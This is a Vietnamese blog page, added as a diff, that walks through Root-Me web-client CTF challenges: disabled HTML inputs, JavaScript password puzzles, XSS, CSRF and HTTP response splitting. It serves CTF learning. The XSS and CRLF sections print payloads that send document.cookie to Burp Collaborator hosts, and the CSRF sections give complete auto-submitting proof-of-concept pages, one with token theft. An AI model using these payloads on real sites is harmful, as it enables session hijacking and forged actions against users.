@@ -1,0 +1,588 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>RooMe (Web-client) | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="Write-Up    HTML – disabled buttons    Resolution    Ở đây ta có 2 thẻ html ẩn bị ẩn , inspect (F12 -&gt; Elements) nó ra t sẽ thấy 2 tag bị disabled .     Tag input bị disable bằng thuộc tính &quot;disab">
+<meta property="og:type" content="article">
+<meta property="og:title" content="RooMe (Web-client)">
+<meta property="og:url" content="http://yoursite.com/2020/06/14/WEB-CLIENT/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="Write-Up    HTML – disabled buttons    Resolution    Ở đây ta có 2 thẻ html ẩn bị ẩn , inspect (F12 -&gt; Elements) nó ra t sẽ thấy 2 tag bị disabled .     Tag input bị disable bằng thuộc tính &quot;disab">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://miro.medium.com/max/1424/1*joz9hfPQ-osvbLiUqfakmg.png">
+<meta property="og:image" content="http://hydrasky.ml/wp-content/uploads/2019/12/image-1024x283.png">
+<meta property="og:image" content="http://hydrasky.ml/wp-content/uploads/2019/12/image-1.png">
+<meta property="og:image" content="http://hydrasky.ml/wp-content/uploads/2019/12/image-2-1024x92.png">
+<meta property="og:image" content="http://hydrasky.ml/wp-content/uploads/2019/12/image-3-1024x264.png">
+<meta property="og:image" content="http://hydrasky.ml/wp-content/uploads/2019/12/image-4.png">
+<meta property="og:image" content="http://hydrasky.ml/wp-content/uploads/2019/12/image-5.png">
+<meta property="og:image" content="http://hydrasky.ml/wp-content/uploads/2019/12/image-7-1024x132.png">
+<meta property="og:image" content="http://hydrasky.ml/wp-content/uploads/2019/12/image-8-1024x278.png">
+<meta property="og:image" content="http://hydrasky.ml/wp-content/uploads/2019/12/image-9-1024x210.png">
+<meta property="og:image" content="http://hydrasky.ml/wp-content/uploads/2019/12/image-10.png">
+<meta property="og:image" content="http://hydrasky.ml/wp-content/uploads/2019/12/image-11.png">
+<meta property="og:image" content="http://hydrasky.ml/wp-content/uploads/2019/12/image-12.png">
+<meta property="og:image" content="http://hydrasky.ml/wp-content/uploads/2019/12/image-13.png">
+<meta property="og:image" content="http://hydrasky.ml/wp-content/uploads/2019/12/image-16.png">
+<meta property="og:image" content="http://hydrasky.ml/wp-content/uploads/2019/12/image-17.png">
+<meta property="og:image" content="http://hydrasky.ml/wp-content/uploads/2019/12/image-18-1024x171.png">
+<meta property="og:image" content="http://hydrasky.ml/wp-content/uploads/2019/12/image-19.png">
+<meta property="article:published_time" content="2020-06-14T07:00:00.000Z">
+<meta property="article:modified_time" content="2020-06-15T16:21:40.236Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://miro.medium.com/max/1424/1*joz9hfPQ-osvbLiUqfakmg.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-WEB-CLIENT" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/06/14/WEB-CLIENT/" class="article-date">
+  <time datetime="2020-06-14T07:00:00.000Z" itemprop="datePublished">2020-06-14</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      RooMe (Web-client)
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <!-- wp:image -->
+<figure class="wp-block-image"><img src="https://miro.medium.com/max/1424/1*joz9hfPQ-osvbLiUqfakmg.png" alt=""/><figcaption><br><strong>Write-Up</strong></figcaption></figure>
+<!-- /wp:image -->
+
+<!-- wp:heading -->
+<h2>HTML – disabled buttons</h2>
+<!-- /wp:heading -->
+
+<!-- wp:heading {"level":4} -->
+<h4><strong>Resolution</strong></h4>
+<!-- /wp:heading -->
+
+<!-- wp:paragraph -->
+<p>Ở đây ta có 2 thẻ html ẩn bị ẩn , inspect (F12 -&gt; Elements) nó ra t sẽ thấy 2 tag bị disabled . </p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image {"id":8,"sizeSlug":"large"} -->
+<figure class="wp-block-image size-large"><img src="http://hydrasky.ml/wp-content/uploads/2019/12/image-1024x283.png" alt="" class="wp-image-8"/><figcaption>Tag input bị disable bằng thuộc tính "disabled"</figcaption></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>Xóa thuộc tính "disabled" xong là có thể sử dụng được, từ đó submit bất cứ cái gì là sẽ có pass.</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image {"id":9,"sizeSlug":"large"} -->
+<figure class="wp-block-image size-large"><img src="http://hydrasky.ml/wp-content/uploads/2019/12/image-1.png" alt="" class="wp-image-9"/><figcaption>Pass nhận được (Xin giấu pass )</figcaption></figure>
+<!-- /wp:image -->
+
+<!-- wp:heading -->
+<h2><code><strong>Javascript - Authentication</strong></code></h2>
+<!-- /wp:heading -->
+
+<!-- wp:heading {"level":3} -->
+<h3><strong>Resolution</strong></h3>
+<!-- /wp:heading -->
+
+<!-- wp:paragraph -->
+<p>View page source ta sẽ thấy việc xử lí đăng nhập sẽ qua file "login.js" </p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image {"id":13,"width":1015,"height":91,"sizeSlug":"large"} -->
+<figure class="wp-block-image size-large is-resized"><img src="http://hydrasky.ml/wp-content/uploads/2019/12/image-2-1024x92.png" alt="" class="wp-image-13" width="1015" height="91"/><figcaption>File login.js</figcaption></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>Check file ta thấy luôn được user và password để đăng nhập. Và pass cx để bypass challenge</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image {"id":14,"width":797,"height":205,"sizeSlug":"large"} -->
+<figure class="wp-block-image size-large is-resized"><img src="http://hydrasky.ml/wp-content/uploads/2019/12/image-3-1024x264.png" alt="" class="wp-image-14" width="797" height="205"/><figcaption>File login.js</figcaption></figure>
+<!-- /wp:image -->
+
+<!-- wp:heading -->
+<h2>Javascript - Source</h2>
+<!-- /wp:heading -->
+
+<!-- wp:heading {"level":3} -->
+<h3>Resolution</h3>
+<!-- /wp:heading -->
+
+<!-- wp:paragraph -->
+<p>Tương tự như challenge 2 bạn chỉ cần view page soure sẽ thấy password.</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:heading -->
+<h2>Javascript - Authentication 2</h2>
+<!-- /wp:heading -->
+
+<!-- wp:heading {"level":3} -->
+<h3>R<strong>esolution</strong></h3>
+<!-- /wp:heading -->
+
+<!-- wp:paragraph -->
+<p>Tương tự như challenge 2 bạn chỉ cần view page soure sẽ thấy file login.js . Nhưng ở đâu cần một chút kiến thức về js để lấy được user và password.</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image {"id":15,"sizeSlug":"large"} -->
+<figure class="wp-block-image size-large"><img src="http://hydrasky.ml/wp-content/uploads/2019/12/image-4.png" alt="" class="wp-image-15"/><figcaption>File login.js</figcaption></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>Như ta có thể thấy TheLists="GOD:HIDDEN" =&gt; TheLists[i].split(":") =&gt; TheSplit[0] = "GOD" ; TheSplit[1]= "HIDDEN" =&gt; Username, Password.</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:heading -->
+<h2>Javascript - Obfuscation 1</h2>
+<!-- /wp:heading -->
+
+<!-- wp:heading {"level":3} -->
+<h3>Resolution</h3>
+<!-- /wp:heading -->
+
+<!-- wp:image {"id":19,"sizeSlug":"large"} -->
+<figure class="wp-block-image size-large"><img src="http://hydrasky.ml/wp-content/uploads/2019/12/image-5.png" alt="" class="wp-image-19"/><figcaption>Password bị mã hóa </figcaption></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>Nhìn qua ta thấy được password được mã hóa bằng URL encode. Sau khi decode ra ta có pass .</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:heading -->
+<h2>Javascript - Obfuscation 2</h2>
+<!-- /wp:heading -->
+
+<!-- wp:heading {"level":3} -->
+<h3>Resolution</h3>
+<!-- /wp:heading -->
+
+<!-- wp:image {"id":21,"width":781,"height":100,"sizeSlug":"large"} -->
+<figure class="wp-block-image size-large is-resized"><img src="http://hydrasky.ml/wp-content/uploads/2019/12/image-7-1024x132.png" alt="" class="wp-image-21" width="781" height="100"/><figcaption>Password bị mã hóa</figcaption></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>Ở challeng này password được mã hóa bằng URL encode  + Unescape  + Convert ascii =&gt; String =&gt; Password</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:heading -->
+<h2>Javascript - Native code</h2>
+<!-- /wp:heading -->
+
+<!-- wp:heading {"level":3} -->
+<h3>Resolution</h3>
+<!-- /wp:heading -->
+
+<!-- wp:image {"id":23,"sizeSlug":"large"} -->
+<figure class="wp-block-image size-large"><img src="http://hydrasky.ml/wp-content/uploads/2019/12/image-8-1024x278.png" alt="" class="wp-image-23"/></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>Sử dụng console để decode và tìm ra password</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image {"id":25,"sizeSlug":"large"} -->
+<figure class="wp-block-image size-large"><img src="http://hydrasky.ml/wp-content/uploads/2019/12/image-9-1024x210.png" alt="" class="wp-image-25"/></figure>
+<!-- /wp:image -->
+
+<!-- wp:heading -->
+<h2>Javascript - Obfuscation 3</h2>
+<!-- /wp:heading -->
+
+<!-- wp:paragraph -->
+<p>View page source ta thấy đoạn javascript, nhưng để tìm ra pass ta ko cần chú ý đến phần dechiffre() chỉ cần decode phần này:</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p>String["fromCharCode"](dechiffre("\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30"));</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p>Chuyển các giá trị hex sang string ta sẽ được chuỗi "55, 56, 54, 79, 115, 69, 114, 116, 107, 49, 50".</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p>Xong bỏ vô String.fromCharCode(), có thể dùng console là ta có kết quả.</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:heading -->
+<h2>XSS - Stored 1</h2>
+<!-- /wp:heading -->
+
+<!-- wp:image {"id":27,"sizeSlug":"large"} -->
+<figure class="wp-block-image size-large"><img src="http://hydrasky.ml/wp-content/uploads/2019/12/image-10.png" alt="" class="wp-image-27"/><figcaption>Form chat vs admin</figcaption></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>Để tạo một xss stored bạn chỉ cần điền payload vào phần message và gửi cho admin rồi chờ đợi cho đến khi admin đọc tin nhắn có chứa mã độc.  </p>
+<!-- /wp:paragraph -->
+
+<!-- wp:quote {"className":"is-style-large"} -->
+<blockquote class="wp-block-quote is-style-large"><p>&lt;script&gt;document.write("&lt;img src='<a rel="noreferrer noopener" target="_blank" href="https://lg5eofo3qvqmoh7d59iqtkeoxf35ru.burpcollaborator.net/%22+document.cookie+?fbclid=IwAR2Qjw0GL4j5rKbqMfQmAINqFeQ31C4RLfvz1YFiOZsC2G5djg_7ukUkh34">https://lg5eofo3qvqmoh7d59iqtkeoxf35ru.burpcollaborator.net/"+document.cookie+</a>"'&gt;");&lt;/script&gt;</p><cite>Payload  + Burp Collaborator client</cite></blockquote>
+<!-- /wp:quote -->
+
+<!-- wp:paragraph -->
+<p>Khi admin đọc tin nhắn script sẽ được thực thi , cookie sẽ được gửi về:</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image {"id":28,"sizeSlug":"large"} -->
+<figure class="wp-block-image size-large"><img src="http://hydrasky.ml/wp-content/uploads/2019/12/image-11.png" alt="" class="wp-image-28"/></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>Cookie của Admin dùng để pass challenge này !</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:heading -->
+<h2>CSRF - 0 protection</h2>
+<!-- /wp:heading -->
+
+<!-- wp:heading {"level":3} -->
+<h3>Resolution</h3>
+<!-- /wp:heading -->
+
+<!-- wp:paragraph -->
+<p>Sau khi tạo tài khoản và đăng nhập vào profile ta sẽ thấy các mục như contact, profile, private. Trong form profile ta có mục update và vs user bình thường sẽ không thực hiện được bởi chỉ có admin ms có quyền tich vào hộp check "status". Để bypass challenge này cần admin thực hiện update thông tin cho user bằng lỗ hổng csrf.</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p>Sử dụng Burpsuite để bắt request submit Update và generate csrf poc hoặc  copy từ source rồi chỉnh sửa . Thêm vào đó thẻ input với type là "checkbox" , ô checkbox phải được check, mặc định values=”on”. Tạo function attack() sẽ thực  hiện submit update khi load lại trang.</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:quote -->
+<blockquote class="wp-block-quote"><p>Csrf poc:</p><cite>&lt;html&gt;<br>&lt;head&gt;<br> &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;<br>&lt;script&gt;<br>function attack() {document.getElementById("csrf").submit()}<br>&lt;/script&gt;<br>&lt;/head&gt;<br>&lt;body onload="attack()"&gt;<br>&lt;form id="csrf" action="http://challenge01.root-me.org/web-client/ch22/?action=profile" method="post" enctype="multipart/form-data"&gt;<br>&lt;input type="text" name="username" value="user"&gt;<br>&lt;input type="checkbox" name="status" value="on" checked&gt;<br>&lt;/form&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;</cite></blockquote>
+<!-- /wp:quote -->
+
+<!-- wp:paragraph -->
+<p>Bấy giờ post vào comment rồi submit cho admin, chờ  tầm 1 phút rồi vào mục "Private" để nhận pass.</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:heading -->
+<h2>XSS - Reflected</h2>
+<!-- /wp:heading -->
+
+<!-- wp:heading {"level":3} -->
+<h3>Resolution</h3>
+<!-- /wp:heading -->
+
+<!-- wp:paragraph -->
+<p>Ta truyền payload vào param "p" và dùng dấu " ' " dể đóng ngoặc bởi dấu phẩy kép bị mã hóa.</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:quote -->
+<blockquote class="wp-block-quote"><p>Xss thông qua url</p><cite>http://challenge01.root-me.org/web-client/ch26/?p=prices%27%20onmouseover=%27alert(1)</cite></blockquote>
+<!-- /wp:quote -->
+
+<!-- wp:image {"id":32,"sizeSlug":"large"} -->
+<figure class="wp-block-image size-large"><img src="http://hydrasky.ml/wp-content/uploads/2019/12/image-12.png" alt="" class="wp-image-32"/><figcaption>Thử nghiệm Xss thành công</figcaption></figure>
+<!-- /wp:image -->
+
+<!-- wp:quote -->
+<blockquote class="wp-block-quote"><p>Sử dụng burp collaborator client</p><cite>http://challenge01.root-me.org/web-client/ch26/?p=prices%27%20onmouseover=window.location=%27https://ylnjvhj0bm0iuxb6163ydnafu60xom.burpcollaborator.net?%27.concat(document.cookie)%20id=%27</cite></blockquote>
+<!-- /wp:quote -->
+
+<!-- wp:paragraph -->
+<p>Sau đó report cho Admin và chờ một chút sẽ nhận được flag</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:heading -->
+<h2>CSRF - token bypass</h2>
+<!-- /wp:heading -->
+
+<!-- wp:heading {"level":3} -->
+<h3>Resolution</h3>
+<!-- /wp:heading -->
+
+<!-- wp:paragraph -->
+<p>Bài này tương tự cài CSRF 0 Protection nhưng khó hơn một chút bởi nó có sử dụng giá trị "forged-token" để ngăn chặn CSRF. Để có thể lừa admin submit như bài trước ta cần phải có token của admin nhưng điều này là không thể ta cần tìm một token  được sinh ra có thể dùng chung user thường vs admin. Trong mục "search" giá trị "forged-token" chúng ta có thể get và bỏ vào request gửi cho admin thực hiện lừa admin  submit một cách hợp lệ với giá trị "forged-token" đó.</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:quote -->
+<blockquote class="wp-block-quote"><p>CSRF POC</p><cite>&lt;html&gt;<br> &lt;head&gt;<br>&lt;!-- CSRF PoC  --&gt;<br> &lt;/head&gt;<br> &lt;body onload="GetToken()"&gt;<br> <br> &lt;form id="form-payload" action="?action=profile" method="POST" enctype="multipart/form-data"&gt;<br>   &lt;input type="hidden" name="username" value="user"/&gt;<br>   &lt;input type="hidden" name="status" value="on"/&gt;<br>   &lt;input type="hidden" id="forged-token" name="token" value=""/&gt;<br>   &lt;input type="submit" value="go"/&gt;<br> &lt;/form&gt;<br> <br> &lt;script&gt;<br> var x = new XMLHttpRequest();<br> function GetToken() {<br>   x.open("GET","?action=profile",true);<br>   x.send(null); <br> }<br> x.onreadystatechange = function() {<br>   if (x.readyState == XMLHttpRequest.DONE) {<br>     var token = x.responseText.match(/name="token" value="(.+)"/)[1];<br>     document.getElementById("forged-token").value = token;<br>     document.getElementById("form-payload").submit();<br>   }<br> }<br> &lt;/script&gt;<br> &lt;/body&gt;<br> &lt;/html&gt;</cite></blockquote>
+<!-- /wp:quote -->
+
+<!-- wp:paragraph -->
+<p>Submit cho admin và chờ một chút ta sẽ có kết quả.</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:heading -->
+<h2>HTTP Response Splitting</h2>
+<!-- /wp:heading -->
+
+<!-- wp:heading {"level":3} -->
+<h3>Resolution</h3>
+<!-- /wp:heading -->
+
+<!-- wp:paragraph -->
+<p>Để vượt qua challenge này ta cần một chút kiến thức về CRLF ( Carriage Return và Line Feed, CR và LF là các ký tự điều khiển, được mã hóa tương ứng 0x0D và 0x0A ). Hai kí tự này là một ký hiệu thể hiện sự kết thúc của response, và một response tiếp theo được bắt đầu, response ban đầu sẽ bị chia tách thành hai và nội dung của response thứ hai sẽ bị điều khiển bởi kẻ tấn công.Kẻ tấn công sau đó có thể tạo một request khác trong cùng một kết nối liên tục, và lừa người nhận (bao gồm cả các yếu tố trung gian) tin rằng response thứ hai này là để trả lời cho request thứ hai.</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image {"id":36,"sizeSlug":"large"} -->
+<figure class="wp-block-image size-large"><img src="http://hydrasky.ml/wp-content/uploads/2019/12/image-13.png" alt="" class="wp-image-36"/><figcaption>Dấu hiệu CRLF</figcaption></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>Chú ý việc đâu tiền cần làm là thêm tiêu đề phản hồi HTTP giả mạo : Content-Length: 0. Điều này khiến trình duyệt web coi đây là phản hồi bị chấm dứt và bắt đầu phân tích một phản hồi mới sau đó là các header còn lại để tạo thành một request hợp lệ.</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:quote -->
+<blockquote class="wp-block-quote"><p>CLRF POC</p><cite>%0D%0AContent-%20Length%3A%200 # ngắt response<br> %0D%0A # blank<br> %0D%0AHTTP%2F1.1%20200%20OK # Tạo response mới<br> %0D%0AContent-Type%3A%20text%2Fhtml <br> %0D%0AX-XSS-Protection%3A%200<br> %0D%0ALast-Modified%3A%20Thu%2C%2001%20Jan%202099%2012%3A00%3A00%20GMT%20<br> %0D%0AContent-Length%3A%20192<br> %0D%0A<br> %0D%0%0D%0A%3cscript%3edocument.write%28%3cimg%20src%3dhttps%3a%2f%2fylnjvhj0bm0iuxb6163ydnafu60xom.burpcollaborator.net%3f%22.concat(document.cookie).concat(%22%20%2f%3e%22))%3c%2fscript%3e</cite></blockquote>
+<!-- /wp:quote -->
+
+<!-- wp:paragraph -->
+<p>Submit và chờ kết quá trả về là session của admin.</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:heading -->
+<h2>XSS STORED 2</h2>
+<!-- /wp:heading -->
+
+<!-- wp:paragraph -->
+<p>Challenge nay cong viec giong voi challenge XSS Store 1 , Nhung diem chu y o day la viec payload khong duoc truyen vao bang input value ma truyen qua http header, va cu the o day la cookie.</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p>Thu bat request gui message cho admin ve check:</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image {"id":51,"sizeSlug":"large"} -->
+<figure class="wp-block-image size-large"><img src="http://hydrasky.ml/wp-content/uploads/2019/12/image-16.png" alt="" class="wp-image-51"/><figcaption>Bat request bang burp<br></figcaption></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>Ket qua tra ve la</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image {"id":52,"sizeSlug":"large"} -->
+<figure class="wp-block-image size-large"><img src="http://hydrasky.ml/wp-content/uploads/2019/12/image-17.png" alt="" class="wp-image-52"/><figcaption>Gia tri cua status duoc lay tu cookie</figcaption></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>Gia tri cua cookie "status= invite" da duoc dung de hien thi nguoi gui tin nhan.</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p> Chen payload va doi admin doc tin nhan thoi!</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:quote -->
+<blockquote class="wp-block-quote"><p>Ket hop vs Burp collaborator client</p><cite>"&gt;document.write(%22&lt;img src=http://075lta73ds2oebant1t1ba7s9jf93y.burpcollaborator.net?%22.concat(document.cookie).concat(%22 /&gt;%22))<br></cite></blockquote>
+<!-- /wp:quote -->
+
+<!-- wp:paragraph -->
+<p>Script da duoc thuc thi</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image {"id":53,"sizeSlug":"large"} -->
+<figure class="wp-block-image size-large"><img src="http://hydrasky.ml/wp-content/uploads/2019/12/image-18-1024x171.png" alt="" class="wp-image-53"/></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>Cookie nhan duoc dung de bypass challenge nay!!!! </p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image {"id":58,"sizeSlug":"large"} -->
+<figure class="wp-block-image size-large"><img src="http://hydrasky.ml/wp-content/uploads/2019/12/image-19.png" alt="" class="wp-image-58"/></figure>
+<!-- /wp:image -->
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2020/06/14/WEB-CLIENT/" data-id="ckbgpmbcy000sqxjm0phz2ou3" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2020/06/14/csp/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          Content Security Policy
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2020/06/14/Web%20Cache%20&%20Cache%20Key/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">Web Cache &amp; Cache Key</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/BugBoutyTip/" rel="tag">BugBoutyTip</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Technology/" rel="tag">Technology</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web-App/" rel="tag">Web App</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web-Server/" rel="tag">Web Server</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/BugBoutyTip/" style="font-size: 10px;">BugBoutyTip</a> <a href="/tags/CTF/" style="font-size: 10px;">CTF</a> <a href="/tags/Technology/" style="font-size: 20px;">Technology</a> <a href="/tags/Web-App/" style="font-size: 13.33px;">Web App</a> <a href="/tags/Web-Server/" style="font-size: 16.67px;">Web Server</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">June 2020</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2020/06/15/CROSS%20SIDE%20REQUEST%20FORGERY/">Cross Side Request Forgery</a>
+          </li>
+        
+          <li>
+            <a href="/2020/06/14/oath/">Oauth</a>
+          </li>
+        
+          <li>
+            <a href="/2020/06/14/Session%20vs%20Token-Based%20Authentication/">Session &amp; Token-Based Authentication</a>
+          </li>
+        
+          <li>
+            <a href="/2020/06/14/Cross%20Site%20Scripting%20(Part1)/">Cross Site Scripting (Part 1)</a>
+          </li>
+        
+          <li>
+            <a href="/2020/06/14/Host%20Header%20Attack/">Host Header Attack</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2020 John Doe<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
